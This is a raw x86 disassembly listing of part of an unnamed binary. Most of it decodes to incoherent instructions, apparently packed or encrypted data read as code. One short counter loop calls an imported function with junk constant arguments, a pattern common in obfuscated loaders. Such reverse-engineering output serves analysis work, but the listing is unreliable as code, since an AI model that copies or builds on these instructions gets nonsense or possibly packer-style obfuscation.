  4047fe:	adc    esi,DWORD PTR [ecx]
  404800:	addr16 cli 
  404802:	dec    esi
  404803:	inc    edx
  404804:	addr16 xchg ecx,eax
  404806:	and    esi,DWORD PTR [edi-0x417a32dd]
  40480c:	inc    ebx
  40480d:	mov    ebx,0xff1d675e
  404812:	dec    edx
  404813:	or     cl,al
  404815:	fimul  DWORD PTR ds:0x82f37492
  40481b:	outs   dx,BYTE PTR ds:[esi]
  40481c:	ds dec ebp
  40481e:	inc    ebp
  40481f:	inc    esi
  404820:	jge    0x404845
  404822:	cmp    DWORD PTR [edi],esp
  404824:	and    dl,BYTE PTR [esi-0x1719b72]
  40482a:	out    0xb5,eax
  40482c:	add    eax,0x36bb5480
  404831:	mov    eax,0xe46934b8
  404836:	sbb    DWORD PTR [edi],ebp
  404838:	dec    ebp
  404839:	pop    edi
  40483a:	pop    esi
  40483b:	xchg   esp,eax
  40483c:	es jecxz 0x40484b
  40483f:	push   ebp
  404840:	lds    ebx,FWORD PTR [ebx-0x7c5dcfea]
  404846:	ret    
  404847:	push   ebp
  404848:	jnp    0x404811
  40484a:	in     al,0xa1
  40484c:	shr    ah,cl
  40484e:	es clc 
  404850:	ja     0x404854
  404852:	int    0x32
  404854:	jae    0x404879
  404856:	bound  eax,QWORD PTR [eax+0x1dd4b8bd]
  40485c:	push   es
  40485d:	(bad)  
  40485f:	or     eax,DWORD PTR [ebx+0x7]
  404862:	frstor [ecx-0x64cd07e3]
  404868:	fild   QWORD PTR [eax*8+0x30f6151]
  40486f:	jge    0x40483c
  404871:	mov    esp,0xac966629
  404876:	sub    DWORD PTR [eax],esp
  404878:	das    
  404879:	and    ebx,DWORD PTR ds:0xf100375a
  40487f:	and    eax,0x16135c7f
  404884:	inc    ebp
  404885:	jl     0x404875
  404887:	jle    0x40483a
  404889:	adc    DWORD PTR [edx-0x32],edi
  40488c:	sbb    dl,BYTE PTR [edx-0x55]
  40488f:	dec    edx
  404890:	push   es
  404891:	test   eax,0x6fe9442d
  404896:	pop    edi
  404897:	xor    BYTE PTR [ebx+0x3cc29f],dl
  40489d:	icebp  
  40489e:	int3   
  40489f:	inc    edx
  4048a0:	push   edx
  4048a1:	imul   ebp,ebp,0x5327ba0
  4048a7:	mov    ss,edi
  4048a9:	in     al,dx
  4048aa:	loopne 0x4048fa
  4048ac:	inc    ebx
  4048ad:	or     esp,DWORD PTR [edi]
  4048af:	ss sbb al,0xa7
  4048b2:	js     0x404925
  4048b4:	out    dx,eax
  4048b5:	int    0x23
  4048b7:	mov    edi,0x4ca61bd1
  4048bc:	imul   ebx,ebx,0xfffffffd
  4048bf:	sub    al,0xe2
  4048c1:	in     al,0x7d
  4048c3:	fisttp QWORD PTR [ebp+0x7c8983f6]
  4048c9:	aad    0x4d
  4048cb:	jb     0x4048a1
  4048cd:	dec    ebp
  4048ce:	push   esi
  4048cf:	mov    eax,0x50e57ecb
  4048d4:	scas   eax,DWORD PTR es:[edi]
  4048d5:	cmc    
  4048d6:	and    eax,0xb0a73af7
  4048db:	mov    BYTE PTR [eax],bl
  4048dd:	sbb    eax,eax
  4048df:	stos   BYTE PTR es:[edi],al
  4048e0:	xor    eax,0xe46f76af
  4048e5:	cwde   
  4048e6:	push   ebp
  4048e7:	jg     0x404873
  4048e9:	jl     0x40490d
  4048eb:	jmp    0xe9b3:0x6e74aff2
  4048f2:	mov    eax,ds:0x701fb7e
  4048f7:	sub    BYTE PTR ds:0xbcb611de,0x27
  4048fe:	xchg   edx,eax
  4048ff:	push   esi
  404900:	fs aas 
  404902:	adc    DWORD PTR [ecx-0x75],ebx
  404905:	psrad  mm3,0x90
  404909:	hlt    
  40490a:	cmp    al,0xc7
  40490c:	ficomp DWORD PTR [eax-0xe]
  40490f:	inc    esi
  404910:	jo     0x4048c0
  404912:	mov    ecx,0x14b84570
  404917:	mov    ebp,0x927cda3
  40491c:	cs in  al,0xad
  40491f:	sbb    al,0xab
  404921:	jge    0x4048da
  404923:	xchg   ecx,eax
  404924:	test   DWORD PTR [esi],ecx
  404926:	push   edi
  404927:	inc    edi
  404928:	cwde   
  404929:	sub    DWORD PTR [edi-0x5866736a],eax
  40492f:	jg     0x4049ad
  404931:	les    ecx,FWORD PTR [edi-0x623e1bdb]
  404937:	xchg   ebx,eax
  404938:	cdq    
  404939:	in     al,0x1c
  40493b:	outs   dx,BYTE PTR ds:[esi]
  40493c:	fs popa 
  40493e:	add    eax,0x5af180df
  404943:	pop    edi
  404944:	dec    esi
  404945:	xchg   esi,eax
  404946:	jns    0x4049aa
  404948:	cmc    
  404949:	xlat   BYTE PTR ds:[ebx]
  40494a:	jmp    0x4049a9
  40494c:	imul   eax,DWORD PTR [edi],0x57e8037b
  404952:	fcom   st(6)
  404954:	fbld   TBYTE PTR [ebp+eiz*1+0x53]
  404958:	sti    
  404959:	out    0xc1,al
  40495b:	aam    0x96
  40495d:	inc    esp
  40495e:	ret    0xa7e9
  404961:	scas   al,BYTE PTR es:[edi]
  404962:	scas   eax,DWORD PTR es:[edi]
  404963:	out    0x4b,eax
  404965:	cs ja  0x4049e0
  404968:	pushf  
  404969:	mov    gs:0xb59bfd9d,al
  40496f:	and    BYTE PTR [esi-0x4c],0xee
  404973:	mov    eax,ebx
  404975:	mov    ebp,0x2dcf797
  40497a:	scas   eax,DWORD PTR es:[edi]
  40497b:	dec    DWORD PTR [edi]
  40497d:	inc    ecx
  40497e:	mov    edi,0x5f6f5364
  404983:	scas   eax,DWORD PTR es:[edi]
  404984:	outs   dx,BYTE PTR ds:[esi]
  404985:	daa    
  404986:	pop    ss
  404987:	test   DWORD PTR [esi],0xf1420701
  40498d:	xchg   ecx,eax
  40498e:	and    DWORD PTR [esi],eax
  404990:	ret    0x5565
  404993:	and    dh,BYTE PTR [esi]
  404995:	pop    ss
  404996:	lahf   
  404997:	jmp    0x40494e
  404999:	jnp    0x89c0a94
  40499f:	stc    
  4049a0:	sbb    eax,0x7f8037f5
  4049a5:	mov    esp,gs
  4049a7:	mov    ss,eax
  4049a9:	push   es
  4049aa:	sbb    eax,0xdb5495c3
  4049af:	fisubr DWORD PTR [ecx-0x4a]
  4049b2:	das    
  4049b3:	(bad)  
  4049b5:	adc    eax,0x7ff47bea
  4049ba:	mov    dl,0x29
  4049bc:	sub    al,0xed
  4049be:	lods   eax,DWORD PTR ds:[esi]
  4049bf:	outs   dx,BYTE PTR ds:[esi]
  4049c0:	inc    edi
  4049c1:	aas    
  4049c2:	mov    dh,0xcb
  4049c4:	push   eax
  4049c5:	stc    
  4049c6:	in     al,0x65
  4049c8:	cmp    al,0xf4
  4049ca:	stos   BYTE PTR es:[edi],al
  4049cb:	inc    eax
  4049cc:	inc    ebp
  4049cd:	xchg   ebx,eax
  4049ce:	jo     0x4049e2
  4049d0:	push   ebx
  4049d1:	fisubr WORD PTR [edi+0x58fa029f]
  4049d7:	adc    bh,BYTE PTR [ecx+0x15ea58af]
  4049dd:	out    0x78,eax
  4049df:	pop    eax
  4049e0:	dec    ebx
  4049e1:	jl     0x404a17
  4049e3:	lock es es in eax,0xab
  4049e8:	je     0x404a25
  4049ea:	xor    esi,DWORD PTR ss:[eax+0x11]
  4049ee:	test   DWORD PTR [eax-0x19],esp
  4049f1:	or     DWORD PTR [ebx-0x10],edx
  4049f4:	icebp  
  4049f5:	jg     0x4049c7
  4049f7:	sub    al,0x91
  4049f9:	mov    ebp,0xe0e73e01
  4049fe:	jns    0x404a55
  404a00:	push   ecx
  404a01:	or     ch,dl
  404a03:	lods   eax,DWORD PTR ds:[esi]
  404a04:	xchg   edx,eax
  404a05:	push   0x5a
  404a07:	ficom  DWORD PTR [ecx-0x1563cf91]
  404a0d:	sub    ebp,DWORD PTR [esi-0x20]
  404a10:	push   es
  404a11:	mov    ebx,0xdcf274f5
  404a16:	sbb    al,0xc6
  404a18:	adc    al,0x91
  404a1a:	and    bh,al
  404a1c:	sbb    DWORD PTR [eax-0x44],ecx
  404a1f:	iret   
  404a20:	jecxz  0x404a1e
  404a22:	mov    edi,eax
  404a24:	(bad)  
  404a25:	sti    
  404a26:	push   eax
  404a27:	dec    ebx
  404a28:	sbb    DWORD PTR [edi-0x80],ecx
  404a2b:	jae    0x404a95
  404a2d:	xchg   esi,eax
  404a2e:	push   esp
  404a2f:	mov    ds:0xfeaa0cf4,al
  404a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a35:	mov    esp,0xb851ac7e
  404a3a:	mov    esp,0x9ca5ece2
  404a3f:	add    BYTE PTR [edx-0x44f7bc52],ch
  404a45:	sbb    ah,BYTE PTR [ecx-0x6dcb2df9]
  404a4b:	scas   al,BYTE PTR es:[edi]
  404a4c:	test   DWORD PTR [ecx+0x7510850],edi
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	and    al,0x41
  404ae4:	and    dl,BYTE PTR [edx+0x78782e46]
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404a89
  404aef:	or     al,0xa3
  404af1:	jp     0x404adb
  404af3:	fstp   TBYTE PTR [esi-0x25]
  404af6:	(bad)  
  404af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af8:	int3   
  404af9:	xchg   ebp,eax
  404afa:	mov    edi,0xbe6d812a
  404aff:	jmp    0x404ae2
  404b01:	pcmpeqw mm7,QWORD PTR ds:0xa00af895
  404b08:	mov    dh,0x1e
  404b0a:	into   
  404b0b:	es adc eax,0x75492314
  404b11:	push   cs
  404b12:	sub    dl,BYTE PTR [eax-0x3507b988]
  404b18:	aaa    
  404b19:	iret   
  404b1a:	shl    BYTE PTR [eax+0x7967a8ef],1
  404b20:	cmp    esi,ecx
  404b22:	pop    ebp
  404b23:	jmp    DWORD PTR [ebx-0x5c]
  404b26:	sar    WORD PTR [ebx+0x4a68a778],cl
  404b2d:	add    eax,0xa0c5bec8
  404b32:	push   ebx
  404b33:	retf   0x49e
  404b36:	push   edx
  404b37:	mov    ?,WORD PTR [edx]
  404b39:	or     eax,DWORD PTR [ecx-0x13]
  404b3c:	shr    BYTE PTR [eax+0x2405aa17],cl
  404b42:	cdq    
  404b43:	or     ah,BYTE PTR [ebx]
  404b45:	lds    ecx,FWORD PTR [eax-0x9b4c1af]
  404b4b:	imul   ebp,DWORD PTR [esi-0x75902f10],0xadf415f4
  404b55:	and    dh,BYTE PTR [esi-0x5946b52b]
  404b5b:	pop    edi
  404b5c:	dec    eax
  404b5d:	mov    ds:0xd8de68b9,al
  404b62:	mov    bh,0x19
  404b64:	sahf   
  404b65:	dec    esi
  404b66:	fs jle 0x404ae9
  404b69:	scas   al,BYTE PTR es:[edi]
  404b6a:	cld    
  404b6b:	mov    bh,0xb3
  404b6d:	(bad)  
  404b6f:	sti    
  404b70:	push   edx
  404b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b72:	cmp    bh,ah
  404b74:	out    0xe0,eax
  404b76:	shl    ecx,0x89
  404b79:	pop    esp
  404b7a:	pusha  
  404b7b:	xor    esp,DWORD PTR [esp+ebp*1]
  404b7e:	cmp    al,0x9d
  404b80:	sbb    cl,BYTE PTR [esi+0x2e]
  404b83:	jnp    0x404b96
  404b85:	int3   
  404b86:	push   ss
  404b87:	ret    0x37c2
  404b8a:	mov    ecx,0x7d22df17
  404b8f:	arpl   bp,si
  404b91:	sbb    eax,0xf5068829
  404b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b97:	loopne 0x404b55
  404b99:	cmp    bl,BYTE PTR [edx+ebp*4]
  404b9c:	lahf   
  404b9d:	jp     0x404b4f
  404b9f:	test   DWORD PTR [ebx+0x265ba113],0x955a5bad
  404ba9:	push   edi
  404baa:	cmp    edx,DWORD PTR [ebp-0x2c]
  404bad:	or     ebx,DWORD PTR [ecx+0x4f498b2d]
  404bb3:	cmp    dl,BYTE PTR [ebx+ecx*8+0x3a]
  404bb7:	xchg   edi,eax
  404bb8:	cwde   
  404bb9:	cmp    BYTE PTR [ebx+0xdc505a],al
  404bbf:	mov    ebp,0xe1bd0294
  404bc4:	jne    0x404bfa
  404bc6:	push   edx
  404bc7:	lea    eax,[edi+0x57]
  404bca:	retf   0x1872
  404bcd:	cmp    DWORD PTR [ebx+0x2b],esp
  404bd0:	mov    ch,0x51
  404bd2:	cdq    
  404bd3:	(bad)  [edi]
  404bd5:	clc    
  404bd6:	or     esi,DWORD PTR [ebx-0x6a531f2a]
  404bdc:	mov    ch,0xce
  404bde:	out    dx,al
  404bdf:	ins    BYTE PTR es:[edi],dx
  404be0:	fdiv   QWORD PTR [esi+0x41e05624]
  404be6:	fdivp  st(5),st
  404be8:	out    dx,al
  404be9:	(bad)  
  404bea:	jg     0x404b78
  404bec:	cmp    al,0x4c
  404bee:	sbb    ebp,DWORD PTR [esp+ecx*1+0x56]
  404bf2:	inc    edi
  404bf3:	aam    0x1f
  404bf5:	sahf   
  404bf6:	xor    esi,DWORD PTR [ecx]
  404bf8:	inc    edx
  404bf9:	cli    
  404bfa:	(bad)  
  404bfb:	in     al,dx
  404bfc:	(bad)  
  404bfd:	pop    eax
  404bfe:	imul   ebx,DWORD PTR [edx+esi*2+0x5602ca2f],0x33
  404c06:	les    eax,FWORD PTR ds:[ebx]
  404c09:	sub    DWORD PTR [ecx-0x4b],ecx
  404c0c:	pop    ebp
  404c0d:	popa   
  404c0e:	jle    0x404bad
  404c10:	cdq    
  404c11:	sub    eax,DWORD PTR [esi]
  404c13:	aaa    
  404c14:	ror    eax,cl
  404c16:	sub    edi,DWORD PTR [ebx+0x44af051f]
  404c1c:	xchg   ebp,eax
  404c1d:	int    0x70
  404c1f:	jb     0x404c1d
  404c21:	pop    esp
  404c22:	push   esi
  404c23:	mov    eax,0x673dcb10
  404c28:	test   al,0xa0
  404c2a:	stos   BYTE PTR es:[edi],al
  404c2b:	shl    DWORD PTR [ebx+0x3a],cl
  404c2e:	mov    esp,0x8f1b8e55
  404c33:	aaa    
  404c34:	mov    ds:0x67d855c,al
  404c39:	cmp    eax,DWORD PTR [eax+0x2a]
  404c3c:	addr16 mov ds:0x130d,eax
  404c40:	push   ebp
  404c41:	inc    BYTE PTR [ebx-0x4d0eb9f0]
  404c47:	aas    
  404c48:	in     eax,0x8d
  404c4a:	dec    edx
  404c4b:	inc    ebp
  404c4c:	mov    ah,0xb8
  404c4e:	pusha  
  404c4f:	pop    eax
  404c50:	mov    ds:0xcc19b9bd,eax
  404c55:	pop    esi
  404c56:	into   
  404c57:	mov    ebp,0xfefcd1ce
  404c5c:	xchg   esp,eax
  404c5d:	sub    bh,BYTE PTR [edi-0x5b081589]
  404c63:	push   ebp
  404c64:	add    eax,0x26c073b7
  404c69:	dec    DWORD PTR [edi]
  404c6b:	bound  edi,QWORD PTR [edx+ebp*2]
  404c6e:	call   0x3409:0xa1eec93
  404c75:	dec    eax
  404c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c77:	jmp    0x54cf6ec2
  404c7c:	jae    0x404c8d
  404c7e:	outs   dx,DWORD PTR ds:[esi]
  404c7f:	cmp    ch,dh
  404c81:	mov    dl,0x57
  404c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c84:	rsm    
  404c86:	push   edx
  404c87:	pop    edi
  404c88:	jb     0x404c0a
  404c8a:	jno    0x404c7b
  404c8c:	sub    ecx,edx
  404c8e:	ins    BYTE PTR es:[edi],dx
  404c8f:	jne    0x404d10
  404c91:	mov    eax,ds:0x2fc50366
  404c96:	dec    ecx
  404c97:	test   DWORD PTR [eax-0xb],edi
  404c9a:	jne    0x404c3a
  404c9c:	mov    bh,0x87
  404c9e:	out    dx,al
  404c9f:	mov    DWORD PTR [edx+0x7b],esi
  404ca2:	jno    0x404c33
  404ca4:	sbb    BYTE PTR [eax-0x6ef15203],cl
  404caa:	jne    0x404cde
  404cac:	pop    esi
  404cad:	cmp    eax,DWORD PTR [ebx]
  404caf:	push   0x388f7225
  404cb4:	mov    al,ah
  404cb6:	xchg   ebx,eax
  404cb7:	and    DWORD PTR [eax+0x4546b5ab],ecx
  404cbd:	and    DWORD PTR [esi],edi
  404cbf:	cmp    al,BYTE PTR [edx]
  404cc1:	arpl   WORD PTR [esi-0x23],bp
  404cc4:	mov    al,ds:0x4b8124af
  404cc9:	adc    al,0x56
  404ccb:	gs mov bh,0x2c
  404cce:	(bad)  
  404ccf:	jmp    0x58de:0x3bf69743
  404cd6:	mov    ebp,0x9d8b8641
  404cdb:	sub    eax,0xe8d35aa
  404ce0:	mov    bh,0xaa
  404ce2:	mov    ds:0x87980f01,eax
  404ce7:	push   ds
  404ce8:	int3   
  404ce9:	mov    edi,0x27caee98
  404cee:	add    DWORD PTR [ebp-0x21],ecx
  404cf1:	(bad)  
  404cf2:	ins    BYTE PTR es:[edi],dx
  404cf3:	es cwde 
  404cf5:	sahf   
  404cf6:	push   es
  404cf7:	xchg   edx,eax
  404cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cf9:	int3   
  404cfa:	test   DWORD PTR [edi+0x66a922de],ecx
  404d00:	mov    edi,0xc19c71c0
  404d06:	lods   al,BYTE PTR ds:[esi]
  404d07:	ret    
  404d08:	aad    0x76
  404d0a:	or     ebx,DWORD PTR [eax]
  404d0c:	rol    edx,1
  404d0e:	pop    esp
  404d0f:	sub    DWORD PTR [ecx-0x1c73c6ca],edi
  404d15:	popa   
  404d16:	jns    0x404cfe
  404d18:	add    bl,bh
  404d1a:	xor    eax,0x5d227d36
  404d1f:	hlt    
  404d20:	mov    bl,BYTE PTR [ecx-0x2b]
  404d23:	pop    ds
  404d24:	push   es
  404d25:	add    al,0x5c
  404d27:	pop    edi
  404d28:	mov    bh,0x99
  404d2a:	pop    ds
  404d2b:	call   0xfec7:0x2a2935de
  404d32:	mov    eax,ds:0x4e49fad8
  404d37:	imul   esi,DWORD PTR [ecx],0x3c
  404d3a:	popf   
  404d3b:	rcr    DWORD PTR [eax+esi*8+0x63],0x5e
  404d40:	inc    ebp
  404d41:	pop    ebp
  404d42:	scas   eax,DWORD PTR es:[di]
  404d44:	pop    es
  404d45:	addr16 ret 0x7838
  404d49:	std    
  404d4a:	add    DWORD PTR [esi-0x34f86391],0x88a067e4
  404d54:	in     eax,dx
  404d55:	mov    esi,0xbec5fd7
  404d5a:	gs jae 0x404d0b
  404d5d:	in     eax,0x7a
  404d5f:	test   DWORD PTR [ebx+ecx*4-0xb37cb5b],ebp
  404d66:	daa    
  404d67:	cmovno ebx,ebx
  404d6a:	sbb    eax,0x5396415b
  404d6f:	xchg   BYTE PTR [eax-0x232fa124],bh
  404d75:	and    edx,DWORD PTR [edi+0x664a71af]
  404d7b:	cld    
  404d7c:	mov    esi,0x2c65d931
  404d81:	cli    
  404d82:	fmul   st(7),st
  404d84:	mov    edx,0x96aefb99
  404d89:	xor    BYTE PTR [edx+0x6],cl
  404d8c:	imul   ecx,DWORD PTR [ecx+0x46d64347],0x48
  404d93:	add    ecx,DWORD PTR [ebx+0x5d70b91d]
  404d99:	out    dx,eax
  404d9a:	adc    dl,BYTE PTR [edx+0x4e]
  404d9d:	mov    ebx,0x709e6b53
  404da2:	jno    0x404df4
  404da4:	out    0xab,eax
  404da6:	(bad)  
  404da8:	cdq    
  404da9:	sub    eax,0xb4371cc
  404dae:	daa    
  404daf:	xchg   edi,eax
  404db0:	retf   
  404db1:	mov    edi,0xb155cebc
  404db6:	sbb    ecx,0x3c530430
  404dbc:	adc    BYTE PTR [eax],0xdc
  404dbf:	xchg   edi,eax
  404dc0:	dec    edx
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	and    DWORD PTR [esi+0x6],edx
  404deb:	test   DWORD PTR [ebx+0x4d787833],ebx
  404df1:	jle    0x404e6b
  404df3:	js     0x404dc9
  404df5:	pop    es
  404df6:	inc    esp
  404df7:	add    eax,0xa379e5d5
  404dfc:	add    cl,BYTE PTR [esi]
  404dfe:	inc    edi
  404dff:	jmp    0xa0ff:0xb1194f64
  404e06:	in     al,dx
  404e07:	test   al,0x2
  404e09:	mov    dh,0xbb
  404e0b:	pop    es
  404e0c:	lock sbb esp,DWORD PTR [ebp+0x13]
  404e10:	mov    eax,0x4f19363a
  404e15:	mov    ebx,0xdf795556
  404e1a:	addr16 daa 
  404e1c:	push   eax
  404e1d:	(bad)  
  404e1e:	int3   
  404e1f:	cli    
  404e20:	dec    DWORD PTR [ebp+0x7f7faaac]
  404e26:	popa   
  404e27:	test   al,0x58
  404e29:	xor    eax,0x6d214887
  404e2e:	and    eax,0x29fb2f02
  404e33:	adc    BYTE PTR [esi+0x78],ch
  404e36:	jne    0x404eab
  404e38:	inc    eax
  404e39:	lds    ecx,FWORD PTR [esi-0x3]
  404e3c:	sub    ebp,DWORD PTR [ebx-0x49]
  404e3f:	movaps xmm2,XMMWORD PTR [ebp-0x5c]
  404e43:	mov    ch,0x2e
  404e45:	cmc    
  404e46:	sar    BYTE PTR [ebx+ebp*1-0x7f],0x53
  404e4b:	adc    al,0x87
  404e4d:	pop    ds
  404e4e:	inc    eax
  404e4f:	mov    edi,0x14367de0
  404e54:	leave  
  404e55:	jl     0x404e46
  404e57:	mov    ds,WORD PTR [ebx]
  404e59:	int3   
  404e5a:	mov    DWORD PTR [edi],edx
  404e5c:	enter  0x40a7,0x62
  404e60:	mov    edx,0x3be39484
  404e65:	mov    ebx,0xbac74060
  404e6a:	or     edx,DWORD PTR [eax-0x9]
  404e6d:	dec    edx
  404e6e:	lock mov dh,0xd
  404e71:	inc    esp
  404e72:	jmp    0x250d8b0c
  404e77:	or     BYTE PTR [ebp-0x530c5bb6],bl
  404e7d:	dec    esp
  404e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e7f:	nop
  404e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e81:	test   ebx,eax
  404e83:	test   bl,0xe1
  404e86:	cwde   
  404e87:	xlat   BYTE PTR ds:[ebx]
  404e88:	push   ecx
  404e89:	dec    esp
  404e8b:	sbb    al,0x66
  404e8d:	fisubr DWORD PTR ds:0x7e512c3c
  404e93:	gs sbb DWORD PTR fs:[edi-0x50],0x24a8036b
  404e9c:	cmp    ecx,DWORD PTR [eax]
  404e9e:	test   ch,ch
  404ea0:	jbe    0x404efa
  404ea2:	push   eax
  404ea3:	xor    BYTE PTR [ebp-0x41],ah
  404ea6:	lea    eax,[edi-0x6c6742f8]
  404eac:	inc    ebx
  404ead:	pop    esi
  404eae:	out    0x83,eax
  404eb0:	repnz adc BYTE PTR [edi+0x5fca7f2e],ah
  404eb7:	ss out 0x95,eax
  404eba:	sbb    BYTE PTR [ecx+edi*1],bh
  404ebd:	xchg   esp,eax
  404ebe:	fsubr  DWORD PTR [edx+0x4]
  404ec1:	bound  esp,QWORD PTR [ecx+ebp*1+0x39c92b2b]
  404ec8:	gs loope 0x404f2e
  404ecb:	xchg   esp,eax
  404ecc:	dec    ecx
  404ecd:	test   al,0x92
  404ecf:	punpckhbw mm0,QWORD PTR [edx+ebx*8-0x17]
  404ed4:	jno    0x404f28
  404ed6:	adc    al,0x64
  404ed8:	stc    
  404ed9:	and    al,0xa9
  404edb:	xchg   edx,eax
  404edc:	pop    es
  404edd:	in     eax,0xb
  404edf:	push   ebp
  404ee0:	sub    edx,DWORD PTR [esi]
  404ee2:	push   esp
  404ee3:	or     ch,BYTE PTR [ecx]
  404ee5:	mov    eax,0xb994629e
  404eea:	fld    QWORD PTR [edi]
  404eec:	hlt    
  404eed:	(bad)  
  404eef:	icebp  
  404ef0:	imul   edi,DWORD PTR [ecx+0x2e],0x5
  404ef4:	jno    0x404f2e
  404ef6:	dec    esp
  404ef7:	ficom  DWORD PTR ds:0x8caf436e
  404efd:	adc    ebx,ecx
  404eff:	mov    BYTE PTR [eax+0x120e4600],bl
  404f05:	test   BYTE PTR [esi],dl
  404f07:	call   0x8485:0x2e078ed0
  404f0e:	(bad)  
  404f0f:	dec    edi
  404f10:	xor    edx,eax
  404f12:	inc    esi
  404f13:	push   ebx
  404f14:	xor    ch,al
  404f16:	add    al,0xc7
  404f18:	push   esi
  404f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1a:	sub    al,0x29
  404f1c:	stc    
  404f1d:	call   0x584b9daa
  404f22:	sub    bl,BYTE PTR [esi-0x3d]
  404f25:	mov    ch,BYTE PTR [ebx-0x3636a5ec]
  404f2b:	dec    ebp
  404f2c:	pop    esi
  404f2d:	push   0x3f1fca6e
  404f32:	leave  
  404f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f34:	jno    0x404eba
  404f36:	cmp    DWORD PTR [esi-0xe1ac36a],0xb9468012
  404f40:	mov    eax,0x47956d51
  404f45:	cmp    al,0xd
  404f47:	test   ebx,edx
  404f49:	add    bh,bl
  404f4b:	(bad)  
  404f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f4d:	cli    
  404f4e:	sti    
  404f4f:	adc    cl,BYTE PTR [ebx+ebp*1+0x47]
  404f53:	cmp    edx,ebx
  404f55:	into   
  404f56:	iret   
  404f57:	or     al,BYTE PTR [ecx]
  404f59:	js     0x404fda
  404f5b:	repnz retf 
  404f5d:	jle    0x404f6e
  404f5f:	jmp    0x7b2e3af0
  404f64:	(bad)  
  404f65:	and    DWORD PTR [ebx+0x64],esi
  404f68:	sbb    BYTE PTR [ebp+0x31e2159a],0x71
  404f6f:	stos   BYTE PTR es:[edi],al
  404f70:	pop    esp
  404f71:	push   0xd326d279
  404f76:	bound  esp,QWORD PTR [ecx+0x79]
  404f79:	cmp    BYTE PTR [esp+ecx*1-0x80],bl
  404f7d:	cdq    
  404f7e:	mov    cl,0xfa
  404f80:	fsub   DWORD PTR [edx+0x61dd2703]
  404f86:	inc    edi
  404f87:	push   edx
  404f88:	add    BYTE PTR [ecx],ch
  404f8a:	sahf   
  404f8b:	sbb    DWORD PTR ds:0xafba263b,0xf99a52f3
  404f95:	int    0xc8
  404f97:	jae    0x405000
  404f99:	pushf  
  404f9a:	ror    ebp,1
  404f9c:	dec    esi
  404f9d:	gs pusha 
  404f9f:	mov    eax,eax
  404fa1:	(bad)  
  404fa2:	push   esp
  404fa3:	pop    ebp
  404fa4:	adc    DWORD PTR [edx+0x3bf8012f],0x86955a7f
  404fae:	daa    
  404faf:	(bad)  
  404fb0:	and    BYTE PTR fs:[edx],bl
  404fb3:	push   ebp
  404fb4:	sbb    al,al
  404fb6:	repnz rol edi,0x69
  404fba:	xchg   ebx,eax
  404fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fbc:	loop   0x40500f
  404fbe:	jnp    0x404f4e
  404fc0:	cwde   
  404fc1:	jmp    FWORD PTR [edi-0x5d]
  404fc4:	sub    bl,BYTE PTR [eax]
  404fc6:	and    BYTE PTR [ebx-0x55ffb5f8],dh
  404fcc:	adc    dl,BYTE PTR [edi+0xed004a4]
  404fd2:	sub    eax,0x280c8d3f
  404fd7:	xchg   edx,eax
  404fd8:	and    dh,BYTE PTR [edx+0x164ae976]
  404fde:	fwait
  404fdf:	sar    DWORD PTR [edi-0xc9d8b76],cl
  404fe5:	fiadd  DWORD PTR ds:0x63693cd6
  404feb:	jb     0x405030
  404fed:	dec    ecx
  404fee:	dec    edx
  404fef:	pop    eax
  404ff0:	fisttp DWORD PTR [esi]
  404ff2:	inc    eax
  404ff3:	mov    bl,0xdc
  404ff5:	fcomp  DWORD PTR [esi]
  404ff8:	inc    esi
  404ff9:	stc    
  404ffa:	mov    ch,BYTE PTR [edx+0xd95c878]
  405000:	mov    bh,0xd8
  405002:	push   ds
  405003:	pop    edi
  405004:	jge    0x404fe4
  405006:	int    0x15
  405008:	add    ebx,esp
  40500a:	int3   
  40500b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500c:	lods   al,BYTE PTR ds:[esi]
  40500d:	pop    esp
  40500e:	addr16 sub eax,0x4feadda1
  405014:	fiadd  DWORD PTR [ecx]
  405016:	xchg   edi,eax
  405017:	jo     0x405016
  405019:	pop    esp
